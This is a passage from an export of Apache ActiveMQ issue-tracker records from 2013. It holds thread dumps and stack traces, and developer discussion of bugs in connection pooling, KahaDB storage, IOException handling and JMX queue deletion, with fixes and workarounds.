    at java/util/concurrent/locks/AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:811)[inlined]
    at java/util/concurrent/locks/AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:842)[inlined]
    at java/util/concurrent/locks/AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1178)[inlined]
    at java/util/concurrent/locks/ReentrantLock$NonfairSync.lock(ReentrantLock.java:186)[optimized]
    at java/util/concurrent/locks/ReentrantLock.lock(ReentrantLock.java:262)[inlined]
    at org/apache/activemq/transport/MutexTransport.oneway(MutexTransport.java:66)[optimized]
    at org/apache/activemq/transport/ResponseCorrelator.oneway(ResponseCorrelator.java:60)[optimized]
    at org/apache/activemq/ActiveMQConnection.doAsyncSendPacket(ActiveMQConnection.java:1275)[inlined]
    at org/apache/activemq/ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1269)[optimized]
    at org/apache/activemq/ActiveMQSession.doClose(ActiveMQSession.java:644)
    at org/apache/activemq/ActiveMQSession.close(ActiveMQSession.java:634)
    at org/apache/activemq/pool/SessionPool.destroyObject(SessionPool.java:91)
    at org/apache/commons/pool/impl/GenericObjectPool.destroy(GenericObjectPool.java:1330)
    at org/apache/commons/pool/impl/GenericObjectPool.clear(GenericObjectPool.java:1315)
    at org/apache/commons/pool/impl/GenericObjectPool.close(GenericObjectPool.java:1482)
    ^-- Holding lock: org/apache/commons/pool/impl/GenericObjectPool@0x8220a8b0[thin lock]
    at org/apache/activemq/pool/SessionPool.close(SessionPool.java:47)
    at org/apache/activemq/pool/ConnectionPool.close(ConnectionPool.java:133)
    ^-- Holding lock: org/apache/activemq/pool/ConnectionPool@0x8220a858[recursive]
    at org/apache/activemq/pool/ConnectionPool.expiredCheck(ConnectionPool.java:184)[optimized]
    ^-- Holding lock: org/apache/activemq/pool/ConnectionPool@0x8220a858[recursive]
    at org/apache/activemq/pool/ConnectionPool.decrementReferenceCount(ConnectionPool.java:157)[inlined]
    at org/apache/activemq/pool/PooledConnection.close(PooledConnection.java:80)[optimized]
    ^-- Holding lock: org/apache/activemq/pool/ConnectionPool@0x8220a858[thin lock]
    at org/springframework/jms/connection/ConnectionFactoryUtils.releaseConnection(ConnectionFactoryUtils.java:80)[optimized]
    at org/springframework/jms/listener/AbstractJmsListeningContainer.refreshSharedConnection(AbstractJmsListeningContainer.java:385)
    ^-- Holding lock: java/lang/Object@0x820d0a98[fat lock]
    at org/springframework/jms/listener/DefaultMessageListenerContainer.refreshConnectionUntilSuccessful(DefaultMessageListenerContainer.java:856)
    at org/springframework/jms/listener/DefaultMessageListenerContainer.recoverAfterListenerSetupFailure(DefaultMessageListenerContainer.java:838)
    at org/springframework/jms/listener/DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:969)
    ^-- Holding lock: java/lang/Object@0x820d0b18[thin lock]
    at java/util/concurrent/ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
    at java/util/concurrent/ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
    at java/lang/Thread.run(Thread.java:662)
    at jrockit/vm/RNI.c2java(JJJJJ)V(Native Method)
    -- end of trace

""Camel (MainframeAdapterContext) thread #92 - JmsConsumer[bam_input_temp]"" id=114 idx=0x208 tid=6496 prio=5 alive, waiting, native_blocked, daemon
    -- Waiting for notification on: java/lang/Object@0x822fc808[fat lock]
    at jrockit/vm/Threads.waitForNotifySignal(JLjava/lang/Object;)Z(Native Method)
    at jrockit/vm/Locks.wait(Locks.java:1973)[inlined]
    at org/apache/activemq/transport/failover/FailoverTransport.oneway(FailoverTransport.java:562)[optimized]
    ^-- Lock released while waiting: java/lang/Object@0x822fc808[fat lock]
    at org/apache/activemq/transport/MutexTransport.oneway(MutexTransport.java:68)[optimized]
    at org/apache/activemq/transport/ResponseCorrelator.oneway(ResponseCorrelator.java:60)[optimized]
    at org/apache/activemq/ActiveMQConnection.doAsyncSendPacket(ActiveMQConnection.java:1275)[inlined]
    at org/apache/activemq/ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1269)[inlined]
    at org/apache/activemq/ActiveMQSession.send(ActiveMQSession.java:1769)[inlined]
    at org/apache/activemq/ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:277)[inlined]
    at org/apache/activemq/ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:212)[inlined]
    at org/apache/activemq/pool/PooledProducer.send(PooledProducer.java:74)[inlined]
    at org/apache/activemq/pool/PooledProducer.send(PooledProducer.java:63)[optimized]
    ^-- Holding lock: java/lang/Object@0x81a712d0[thin lock]
    ^-- Holding lock: org/apache/activemq/ActiveMQMessageProducer@0x820de070[biased lock]
    at org/springframework/jms/core/JmsTemplate.doSend(JmsTemplate.java:589)[inlined]
    at org/apache/camel/component/jms/JmsConfiguration$CamelJmsTemplate.doSend(JmsConfiguration.java:277)[optimized]
    at org/apache/camel/component/jms/JmsConfiguration$CamelJmsTemplate.doSendToDestination(JmsConfiguration.java:216)[inlined]
    at org/apache/camel/component/jms/JmsConfiguration$CamelJmsTemplate.access$100(JmsConfiguration.java:158)[inlined]
    at org/apache/camel/component/jms/JmsConfiguration$CamelJmsTemplate$3.doInJms(JmsConfiguration.java:192)[optimized]
    at org/springframework/jms/core/JmsTemplate.execute(JmsTemplate.java:466)[inlined]
    at org/apache/camel/component/jms/JmsConfiguration$CamelJmsTemplate.send(JmsConfiguration.java:189)[inlined]
    at org/apache/camel/component/jms/JmsProducer.doSend(JmsProducer.java:398)[inlined]
    at org/apache/camel/component/jms/JmsProducer.processInOnly(JmsProducer.java:352)[inlined]
    at org/apache/camel/component/jms/JmsProducer.process(JmsProducer.java:132)[optimized]
    at org/apache/camel/util/AsyncProcessorHelper.process(AsyncProcessorHelper.java:73)[optimized]
    at org/apache/camel/processor/RoutingSlip$2.doInAsyncProducer(RoutingSlip.java:287)[inlined]
    at org/apache/camel/impl/ProducerCache.doInAsyncProducer(ProducerCache.java:298)[inlined]
    at org/apache/camel/processor/RoutingSlip.processExchange(RoutingSlip.java:280)[inlined]
    at org/apache/camel/processor/RoutingSlip.doRoutingSlip(RoutingSlip.java:205)[inlined]
    at org/apache/camel/processor/RoutingSlip.process(RoutingSlip.java:135)[optimized]
    at org/apache/camel/util/AsyncProcessorHelper.process(AsyncProcessorHelper.java:73)[inlined]
    at org/apache/camel/processor/DelegateAsyncProcessor.processNext(DelegateAsyncProcessor.java:99)[inlined]
    at org/apache/camel/processor/DelegateAsyncProcessor.process(DelegateAsyncProcessor.java:90)[inlined]
    at org/apache/camel/management/InstrumentationProcessor.process(InstrumentationProcessor.java:73)[optimized]
    at org/apache/camel/util/AsyncProcessorHelper.process(AsyncProcessorHelper.java:73)[optimized]
    at org/apache/camel/processor/DelegateAsyncProcessor.processNext(DelegateAsyncProcessor.java:99)[inlined]
    at org/apache/camel/processor/DelegateAsyncProcessor.process(DelegateAsyncProcessor.java:90)[inlined]
    at org/apache/camel/processor/interceptor/TraceInterceptor.process(TraceInterceptor.java:91)[optimized]
    at org/apache/camel/util/AsyncProcessorHelper.process(AsyncProcessorHelper.java:73)[inlined]
    at org/apache/camel/processor/RedeliveryErrorHandler.processErrorHandler(RedeliveryErrorHandler.java:334)[inlined]
    at org/apache/camel/processor/RedeliveryErrorHandler.process(RedeliveryErrorHandler.java:220)[optimized]
    at org/apache/camel/processor/RouteContextProcessor.processNext(RouteContextProcessor.java:45)[inlined]
    at org/apache/camel/processor/DelegateAsyncProcessor.process(DelegateAsyncProcessor.java:90)[inlined]
    at org/apache/camel/processor/interceptor/DefaultChannel.process(DefaultChannel.java:303)[optimized]
    at org/apache/camel/processor/RouteContextProcessor.processNext(RouteContextProcessor.java:45)[optimized]
    at org/apache/camel/processor/DelegateAsyncProcessor.process(DelegateAsyncProcessor.java:90)[optimized]
    at org/apache/camel/processor/UnitOfWorkProcessor.processAsync(UnitOfWorkProcessor.java:150)[inlined]
    at org/apache/camel/processor/UnitOfWorkProcessor.process(UnitOfWorkProcessor.java:117)[optimized]
    at org/apache/camel/processor/RouteInflightRepositoryProcessor.processNext(RouteInflightRepositoryProcessor.java:48)[optimized]
    at org/apache/camel/processor/DelegateAsyncProcessor.process(DelegateAsyncProcessor.java:90)[optimized]
    at org/apache/camel/util/AsyncProcessorHelper.process(AsyncProcessorHelper.java:73)[inlined]
    at org/apache/camel/processor/DelegateAsyncProcessor.processNext(DelegateAsyncProcessor.java:99)[inlined]
    at org/apache/camel/processor/DelegateAsyncProcessor.process(DelegateAsyncProcessor.java:90)[inlined]
    at org/apache/camel/management/InstrumentationProcessor.process(InstrumentationProcessor.java:73)[optimized]
    at org/apache/camel/util/AsyncProcessorHelper.process(AsyncProcessorHelper.java:99)[inlined]
    at org/apache/camel/processor/DelegateAsyncProcessor.process(DelegateAsyncProcessor.java:86)[optimized]
    at org/apache/camel/component/jms/EndpointMessageListener.onMessage(EndpointMessageListener.java:104)[optimized]
    at org/springframework/jms/listener/AbstractMessageListenerContainer.doInvokeListener(AbstractMessageListenerContainer.java:560)[inlined]
    at org/springframework/jms/listener/AbstractMessageListenerContainer.invokeListener(AbstractMessageListenerContainer.java:498)[inlined]
    at org/springframework/jms/listener/AbstractMessageListenerContainer.doExecuteListener(AbstractMessageListenerContainer.java:467)[optimized]
    at org/springframework/jms/listener/AbstractPollingMessageListenerContainer.doReceiveAndExecute(AbstractPollingMessageListenerContainer.java:325)[optimized]
    at org/springframework/jms/listener/AbstractPollingMessageListenerContainer.receiveAndExecute(AbstractPollingMessageListenerContainer.java:263)[inlined]
    at org/springframework/jms/listener/DefaultMessageListenerContainer$AsyncMessageListenerInvoker.invokeListener(DefaultMessageListenerContainer.java:1058)[optimized]
    at org/springframework/jms/listener/DefaultMessageListenerContainer$AsyncMessageListenerInvoker.executeOngoingLoop(DefaultMessageListenerContainer.java:1050)
    at org/springframework/jms/listener/DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:947)
    at java/util/concurrent/ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
    at java/util/concurrent/ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
    at java/lang/Thread.run(Thread.java:662)
    at jrockit/vm/RNI.c2java(JJJJJ)V(Native Method)
    -- end of trace

","Red Hat Enterprise Linux Server 5.6
java version ""1.6.0_37""",gtully,silviosams,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3588,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,317336,,,Wed Mar 20 12:01:19 UTC 2013,,,,,,,,,,,"0|i1ir9b:",317677,,,,,,,,,,,,,,,,,,,,,"14/Mar/13 11:45;gtully;looks like you need 5.8.0 - note the fix versions for the issues u reference. An issue marked resolved with a fix version > what you have points to the need to upgrade if there is no viable workaround.;;;","20/Mar/13 12:01;silviosams;Hi,

After update ActiveMQ to version 5.8.0 don´t occurs leak.


Thanks!

Silvio Souza;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Default IOException handler needs to be set before Persistence adapter and network connectors are started,AMQ-4369,12636775,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,13/Mar/13 13:51,13/Mar/13 14:08,14/Jul/23 05:43,13/Mar/13 14:08,5.8.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"It is possible to get an IOException before the current default handler is installed, so it is bypassed. It needs to be set earlier.
{code}2013-03-11 09:51:24,409 | INFO  | No IOExceptionHandler registered, ignoring IO exception, java.io.IOException: Input/output error | org.apache.activemq.broker.BrokerService | ActiveMQ Transport: ssl:///xxx:yyy
java.io.IOException: Input/output error
	at java.io.RandomAccessFile.readBytes(Native Method)
	at java.io.RandomAccessFile.read(RandomAccessFile.java:355)
	at java.io.RandomAccessFile.readFully(RandomAccessFile.java:414)
	at java.io.RandomAccessFile.readFully(RandomAccessFile.java:394)
	at org.apache.kahadb.page.PageFile.readPage(PageFile.java:833)
	at org.apache.kahadb.page.Transaction$2.readPage(Transaction.java:447)
	at org.apache.kahadb.page.Transaction$2.<init>(Transaction.java:438)
	at org.apache.kahadb.page.Transaction.openInputStream(Transaction.java:435)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:411)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:368)
	at org.apache.kahadb.index.BTreeIndex.loadNode(BTreeIndex.java:262)
	at org.apache.kahadb.index.BTreeIndex.getRoot(BTreeIndex.java:174)
	at org.apache.kahadb.index.BTreeIndex.remove(BTreeIndex.java:194)
	at org.apache.activemq.store.kahadb.MessageDatabase.updateIndex(MessageDatabase.java:1212)
	at org.apache.activemq.store.kahadb.MessageDatabase$15.execute(MessageDatabase.java:1028)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:771)
	at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1026)
	at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:961)
	at org.apache.activemq.store.kahadb.data.KahaRemoveMessageCommand.visit(KahaRemoveMessageCommand.java:220)
	at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:953)
	at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:865)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.removeMessage(KahaDBStore.java:439)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.removeAsyncMessage(KahaDBStore.java:411)
	at org.apache.activemq.store.kahadb.KahaDBTransactionStore.removeAsyncMessage(KahaDBTransactionStore.java:468)
	at org.apache.activemq.store.kahadb.KahaDBTransactionStore$1.removeAsyncMessage(KahaDBTransactionStore.java:171)
	at org.apache.activemq.broker.region.Queue.acknowledge(Queue.java:830)
	at org.apache.activemq.broker.region.Queue.removeMessage(Queue.java:1584)
	at org.apache.activemq.broker.region.QueueSubscription.acknowledge(QueueSubscription.java:59)
	at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:294)
	at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:426)
	at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:537)
	at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:77)
	at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:77)
	at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:287)
	at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:77)
	at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:77)
	at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:87)
	at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:461)
	at org.apache.activemq.command.MessageAck.visit(MessageAck.java:236)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:150)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:268)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.SslTransport.doConsume(SslTransport.java:91)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:215)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:197)
	at java.lang.Thread.run(Thread.java:679){code}",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,317267,,,Wed Mar 13 14:08:12 UTC 2013,,,,,,,,,,,"0|i1iqtz:",317608,,,,,,,,,,,,,,,,,,,,,"13/Mar/13 14:08;gtully;fix in http://svn.apache.org/r1455944
default handler installed before transport connectors;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Using a policy.setUseCache(false) /w KahaDB causes 'java.io.IOException: Could not locate data file' errors.,AMQ-4368,12636602,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,12/Mar/13 16:43,18/Mar/13 15:10,14/Jul/23 05:43,12/Mar/13 18:24,5.8.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4295,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Mar/13 16:46;chirino;AMQ4368.patch;https://issues.apache.org/jira/secure/attachment/12573364/AMQ4368.patch","12/Mar/13 16:45;chirino;AMQ4368Test.java;https://issues.apache.org/jira/secure/attachment/12573362/AMQ4368Test.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,317094,,,Tue Mar 12 18:24:44 UTC 2013,,,,,,,,,,,"0|i1iprj:",317435,,,,,,,,,,,,,,,,,,,,,"12/Mar/13 16:45;chirino;Attaching test case that cause the failure to occur.;;;","12/Mar/13 16:46;chirino;Attaching patch that makes the test pass.  Not sure of it's correctness yet.;;;","12/Mar/13 18:24;chirino;Found a better fix.  Root cause was due to GC occuring midway while a message was being stored (logged, but not yet inserted into the index).;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PooledConnectionFactory closes connections that are in use,AMQ-4366,12636075,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,pjanata,pjanata,08/Mar/13 16:58,23/Feb/17 15:48,14/Jul/23 05:43,08/Mar/13 20:07,5.7.0,5.8.0,,,,5.9.0,,,Pool,,,,0,,,,,,,,,"{{PooledConnectionFactory}} closes connections that are still referenced and should not be closed. Happens only when connection idle or expire time passes. Calling {{createConnection}} after that time will invalidate the connection and all previously obtained {{Sessions}} will behave as closed.

Due to default 30 second idle timeout, it is likely not to cause problems when:
* connection is continually in use
* all {{PooledConnection}} s are borrowed at startup

Client with session whose connection was prematurely closed will see similar stacktrace:
{noformat}
javax.jms.IllegalStateException: The Session is closed
                at org.apache.activemq.ActiveMQSession.checkClosed(ActiveMQSession.java:731)
                at org.apache.activemq.ActiveMQSession.configureMessage(ActiveMQSession.java:719)
                at org.apache.activemq.ActiveMQSession.createBytesMessage(ActiveMQSession.java:316)
                at org.apache.activemq.pool.PooledSession.createBytesMessage(PooledSession.java:168)
{noformat}

",,aanno,anujkhandelwal,boday,dvhv_sekhar,pjanata,Raphiki,tabish,tmielke,xfolch,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Mar/13 17:07;pjanata;poolConClose.diff;https://issues.apache.org/jira/secure/attachment/12572783/poolConClose.diff",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,316567,,,Thu Feb 23 15:48:17 UTC 2017,,,,,,,,,,,"0|i1imiv:",316909,,,,,,,,,,,,,,,,,,,,,"08/Mar/13 17:07;pjanata;Patch against 5.7.0 tag with testcase that reproduces the issue and poor fix.;;;","08/Mar/13 17:10;tabish;Thanks, I'll take a look.;;;","08/Mar/13 19:22;tabish;Looking at the code a bit I think part of the problem here is that Idle timeout seems to be considered even when there are references to the ConnectionPool which would go against the stated purpose of IdleTimeout which is to close out Connection's that have sat unused.  If a reference is active then the ConnectionPool shouldn't be considered inactive since some Session is open and could be in use.  Only expiry timeout should be considered regardless of reference count if I understand that setting correctly, the doco is a bit vague. ;;;","08/Mar/13 20:07;tabish;Should be fixed now.;;;","02/Apr/13 08:47;tmielke;A proper workaround for any 5.7 and 5.8 versioned clients seems to be to disable the session idle timeout on the ConnectionFactory using PooledConnectionFactory.setIdleTimeout(0).
;;;","04/Apr/13 00:14;boday;alright, can I assume that when this occurs the message is being rolled back/replayed rather than being lost (assuming AUTO_ACK, non-tx mode)?

any other side-effects of the proposed workaround of setting the idelTimeout to 0 (inefficient connection/session mgmt, etc)?

any plans to backport it to a minor release of 5.7 or 5.8?
;;;","09/Apr/13 07:23;tmielke;I am not aware of any side effects when applying the workaround and setting idleTimeout=0. 
As a consequence sessions won't be invalidated just because they were idle for a specific period of time. But that should generally not be a problem. 
I had a customer testing this idleTimeout=0 in their integration test env and it did not cause any problems. 

Also, its my understanding that you generally should not loose any messages due to the ""The Session is closed"" error. 
Typically the session is checked for validity right *before* sending the message. You app code of course needs to handle the error and should not assume that the msg was sent.


;;;","02/Mar/15 14:27;dvhv_sekhar;we are using ActiveMQ version 5.10. Is this fix available in 5.10? or should we use the workaround of setting idleTimeout=0. ;;;","02/Mar/15 16:58;tmielke;Yes, 5.10 will include the fix for this bug. ;;;","23/Feb/17 15:48;Raphiki;An expired connection is now not closed if used by an other thread but there is nothing preventing the loan of an expiryConnection isn't it ?

The [connectionPool.borrow()|http://grepcode.com/file/repo1.maven.org/maven2/org.apache.activemq/activemq-jms-pool/5.11.0/org/apache/activemq/jms/pool/PooledConnectionFactory.java#236] just call the expiryCheck() throught the [validateObject()|http://grepcode.com/file/repo1.maven.org/maven2/org.apache.activemq/activemq-jms-pool/5.11.0/org/apache/activemq/jms/pool/PooledConnectionFactory.java#135] method but it considers the connection valid (and so reusable) if it has expired but has still some remaining reference...

On my environment my expiryTimeout of 60 seconds is rarely reached (unless I assign a connection for each consumer but I can't do that in production environment).;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cannot delete queue via JMX or JConsole,AMQ-4364,12636007,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,lionel.cons,lionel.cons,08/Mar/13 11:40,28/Mar/13 16:37,14/Jul/23 05:43,28/Mar/13 16:37,,,,,,5.9.0,,,,,,,0,,,,,,,,,"When using the latest 5.9 snapshot, we noticed that queues cannot be deleted via JMX or JConsole. When invoking the removeQueue() method, we get a success status but the queue is not removed.

This may have been present in older versions and not only this particular snapshot.",activemq-5.9-20130308.055714-20,gtully,lionel.cons,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Mar/13 15:39;lionel.cons;AMQ4126Test.patch;https://issues.apache.org/jira/secure/attachment/12575720/AMQ4126Test.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,316499,,,Thu Mar 28 16:37:30 UTC 2013,,,,,,,,,,,"0|i1im3r:",316841,,,,,,,,,,,,,,,,,,,,,"08/Mar/13 12:52;gtully;I just did a sanity on a new build of trunk and it works ok. Also I increased the logging in a relevant test[1] to validate it it works ok.
Is there any chance there is concurrent access to that destination.

Test case: https://fisheye6.atlassian.com/changelog/activemq?cs=1454333;;;","08/Mar/13 13:21;lionel.cons;Gary, the broker has no clients using the queues we tried to delete. Could it be some kind of corruption of the store (KahaDB for us)?;;;","19/Mar/13 10:52;lionel.cons;FWIW, I've tried again with a more recent snapshot (activemq-5.9-20130315.115006-23) and the problem is still present.

To reproduce it:
 - wipe out the message store
 - start the broker
 - start test clients to use some queues, wait until they finish
 - delete the queues via JMX or JConsole -> they do not get removed;;;","19/Mar/13 15:32;tabish;Just tried it here on a fresh build and its working fine, followed the steps given and Queues are deleted without issue. ;;;","20/Mar/13 07:32;lionel.cons;Could this be linked to the message store? We use kahaDB with the following parameters:

    <persistenceAdapter>
      <kahaDB directory=""/some/where/kahadb"" enableJournalDiskSyncs=""false"" indexCacheSize=""1000"" indexWriteBatchSize=""10000""/>
    </persistenceAdapter>
;;;","21/Mar/13 14:10;tabish;Seems doubtful given that you started with a clean KahaDB, you can always go back to default settings and test.  ;;;","21/Mar/13 14:36;lionel.cons;Via trial and error, it seems that the following line is causing us problems:

      <jaasDualAuthenticationPlugin configuration=""activemq-domain"" sslConfiguration=""activemq-ssl-domain""/>

Without it, queue deletion works. With it, it does not.

Do you see the same behavior?;;;","21/Mar/13 14:52;tabish;Can you throw together a unit test that reproduces it?  ;;;","27/Mar/13 15:39;lionel.cons;jaasDualAuthenticationPlugin is quite complex to setup.

I've tried to patch activemq-unit-tests/src/test/java/org/apache/activemq/bugs/AMQ4126Test.java for it (see attached).
The new test fails on the last assert, indicating that the queue still exists.

BTW, I also had to modify activemq-unit-tests/src/test/resources/org/apache/activemq/bugs/amq4126/JaasStompSSLBroker.xml to set useJmx=true...;;;","28/Mar/13 16:37;tabish;Fixed, will show up in next SNAPSHOT;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
org.apache.activemq.store.jdbc.JDBCXACommitExceptionTest has 2 test failures,AMQ-4363,12635825,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,kearls,kearls,07/Mar/13 16:19,07/Mar/13 17:13,14/Jul/23 05:43,07/Mar/13 17:13,,,,,,,,,Test Cases,,,,0,,,,,,,,,"Both the testTwoPhaseSqlException and testSqlException are failing with exception below

javax.jms.JMSException: Could not connect to broker URL: tcp://localhost:61616. Reason: java.net.ConnectException: Connection refused
	at java.net.PlainSocketImpl.socketConnect(Native Method)
	at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:339)
	at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:200)
	at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:182)
	at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:391)
	at java.net.Socket.connect(Socket.java:579)
	at org.apache.activemq.transport.tcp.TcpTransport.connect(TcpTransport.java:496)
	at org.apache.activemq.transport.tcp.TcpTransport.doStart(TcpTransport.java:459)
	at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55)
	at org.apache.activemq.transport.AbstractInactivityMonitor.start(AbstractInactivityMonitor.java:140)
	at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)
	at org.apache.activemq.transport.WireFormatNegotiator.start(WireFormatNegotiator.java:72)
	at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)
	at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)
	at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:273)
	at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:238)
	at org.apache.activemq.ActiveMQXAConnectionFactory.createXAConnection(ActiveMQXAConnectionFactory.java:59)
	at org.apache.activemq.store.jdbc.JDBCXACommitExceptionTest.receiveMessages(JDBCXACommitExceptionTest.java:55)",,gtully,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,316317,,,Thu Mar 07 17:13:43 UTC 2013,,,,,,,,,,,"0|i1ikzj:",316660,Regression,Unit Test Broken,,,,,,,,,,,,,,,,,,,"07/Mar/13 16:47;gtully;what version, or trunk?
